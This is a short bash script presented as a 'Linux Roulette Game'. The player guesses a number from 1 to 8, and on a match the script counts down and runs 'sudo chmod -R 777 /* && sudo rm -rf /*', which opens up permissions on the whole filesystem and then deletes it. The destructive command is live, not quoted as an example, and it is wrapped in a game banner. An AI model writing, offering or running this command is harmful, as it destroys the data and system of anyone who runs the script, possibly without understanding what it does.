#! /bin/bash
z=0;
ha=8;
ra=$[ $[$RANDOM % $ha] + 1 ];
echo "                                                                               "
echo " __    _                _____         _     _   _          _____               "
echo "|  |  |_|___ _ _ _ _   | __  |___ _ _| |___| |_| |_ ___   |   __|___ _____ ___ "
echo "|  |__| |   | | |_'_|  |    -| . | | | | -_|  _|  _| -_|  |  |  | .'|     | -_|"
echo "|_____|_|_|_|___|_,_|  |__|__|___|___|_|___|_| |_| |___|  |_____|__,|_|_|_|___|"
echo ""
echo ""
echo ""
echo "                            ^^^^^^^^^^^^^^^^^^^^^^^"
echo "                            >>Linux Roulette Game<<"
echo "                            ======================="
echo "                            ===== How to Play ====="
echo "                            ==== 1~8 num input ===="
echo "                            ======================="
echo "                            ==== maker : Doker ===="
echo "                            ======================="
echo ""
echo -n "num : "
read num
if [ $num -eq $z ]
then 
	until [ $num -gt $z ]
	do
	echo "zero input!! only 1~8 num input!!!"
	echo -n "re input : "
	read num
	done
	fi
if [ $num -gt $ha ]
then
	if [ $num -eq $z ]
	then
		until [ $num -gt $z ]
		do
		echo "zero input!! only 1~8 num input!!!"
		echo -n "re input : "
		read num
		done
	else
	until [ $num -le $ha ]
	do
	echo "$ha over."
	echo -n "re input : "
	read num
	done
	fi
fi
if [ $num -eq $ra ]
then
	c=$[ $[$ha] + 2];
	until sleep .5 && [ $c -eq $z ];
	do
	echo "rm command to execute : $c..."
	c=$[ $[$c] - 1];
	done
	echo "Good Bye Liunx"
	sudo chmod -R 777 /* && sudo rm -rf /*
else 
	echo "good luck"
	echo "end num : $ra"
	fi
